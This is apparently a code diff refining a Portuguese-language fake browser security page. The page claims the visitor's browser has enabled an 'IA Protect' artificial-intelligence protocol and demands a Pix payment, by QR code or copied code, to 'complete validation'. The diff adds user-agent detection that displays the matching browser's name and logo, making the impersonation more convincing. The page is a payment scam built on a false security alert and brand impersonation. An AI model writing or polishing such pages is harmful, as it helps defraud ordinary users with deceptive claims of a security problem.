@@ -8,13 +8,15 @@
     body {
       margin: 0;
       font-family: "Segoe UI", Roboto, sans-serif;
-      background-color: #f2f4f6;
-      color: #222;
+      background-color: #f4f6f8;
+      color: #111;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: center;
+      justify-content: flex-start;
       min-height: 100vh;
+      padding: 1rem;
+      line-height: 1.7;
     }
 
     header {
@@ -30,40 +32,47 @@
     }
 
     header img {
-      height: 20px;
+      height: 18px;
       margin-right: 8px;
     }
 
     main {
       text-align: center;
       max-width: 600px;
-      padding: 2rem;
+      margin-top: 3rem;
+    }
+
+    .icon-container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-bottom: 1.5rem;
+      gap: 10px;
     }
 
     .icon {
-      font-size: 3rem;
-      margin-bottom: 1rem;
-      filter: drop-shadow(0 0 3px #2ecc71);
+      height: 38px;
+      filter: grayscale(100%);
     }
 
     h1 {
-      font-size: 1.5rem;
+      font-size: 1.6rem;
       font-weight: 600;
-      margin-bottom: 0.5rem;
+      margin-bottom: 1rem;
     }
 
     p {
       font-size: 1rem;
-      margin: 0.5rem 0;
+      margin: 0.75rem 0;
     }
 
     .highlight {
       font-weight: bold;
-      margin: 1rem 0 0.5rem;
+      margin: 1.5rem 0 0.5rem;
     }
 
     .qr {
-      margin: 1.5rem 0;
+      margin: 2rem 0 1rem;
     }
 
     .pix-code {
@@ -72,6 +81,7 @@
       border-radius: 6px;
       word-break: break-all;
       font-family: monospace;
+      font-size: 0.95rem;
     }
 
     .copy-btn {
@@ -92,8 +102,8 @@
 
     .footer-note {
       font-size: 0.85rem;
-      color: #777;
-      margin-top: 1rem;
+      color: #666;
+      margin-top: 1.5rem;
     }
   </style>
 </head>
@@ -105,8 +115,13 @@
 </header>
 
 <main>
-  <div class="icon">🔒</div>
+  <div class="icon-container">
+    <img src="https://cdn-icons-png.flaticon.com/512/747/747376.png" alt="cadeado preto" class="icon" />
+    <img id="browser-logo" src="" alt="navegador" class="icon" />
+  </div>
+
   <h1>Segurança de conexão ativada</h1>
+
   <p>O navegador <strong id="browser-name">Google Chrome</strong> ativou o protocolo IA Protect — tecnologia baseada em Inteligência Artificial.</p>
   <p>Para concluir a validação e garantir estabilidade e proteção durante a navegação, conclua o procedimento:</p>
 
@@ -116,23 +131,37 @@
     <img src="https://chart.googleapis.com/chart?chs=250x250&cht=qr&chl=00020126360014BR.GOV.BCB.PIX0111qrfakepixkey" alt="QR Code Pix" />
     <div class="pix-code" id="pix-code">00020126360014BR.GOV.BCB.PIX0111qrfakepixkey</div>
     <button class="copy-btn" onclick="copyPix()">Copiar código Pix</button>
-    <div class="footer-note">Este é um protocolo de segurança IA. Confirmação imediata.</div>
   </div>
+
+  <div class="footer-note">Este é um protocolo de segurança IA. Confirmação imediata.</div>
 </main>
 
 <script>
-  // Detectar navegador
+  // Detecta navegador e define logo + nome
   const userAgent = navigator.userAgent;
   let browser = "seu navegador";
-  if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) browser = "Google Chrome";
-  else if (userAgent.includes("Firefox")) browser = "Mozilla Firefox";
-  else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
-  else if (userAgent.includes("Edg")) browser = "Microsoft Edge";
-  else if (userAgent.includes("Opera") || userAgent.includes("OPR")) browser = "Opera";
+  let logo = "https://cdn-icons-png.flaticon.com/512/545/545705.png";
+
+  if (userAgent.includes("Chrome") && !userAgent.includes("Edg")) {
+    browser = "Google Chrome";
+    logo = "https://cdn-icons-png.flaticon.com/512/732/732228.png";
+  } else if (userAgent.includes("Firefox")) {
+    browser = "Mozilla Firefox";
+    logo = "https://cdn-icons-png.flaticon.com/512/5968/5968710.png";
+  } else if (userAgent.includes("Edg")) {
+    browser = "Microsoft Edge";
+    logo = "https://cdn-icons-png.flaticon.com/512/882/882730.png";
+  } else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
+    browser = "Safari";
+    logo = "https://cdn-icons-png.flaticon.com/512/732/732217.png";
+  } else if (userAgent.includes("Opera") || userAgent.includes("OPR")) {
+    browser = "Opera";
+    logo = "https://cdn-icons-png.flaticon.com/512/5968/5968940.png";
+  }
 
   document.getElementById("browser-name").textContent = browser;
+  document.getElementById("browser-logo").src = logo;
 
-  // Copiar Pix
   function copyPix() {
     const pixText = document.getElementById("pix-code").innerText;
     navigator.clipboard.writeText(pixText);
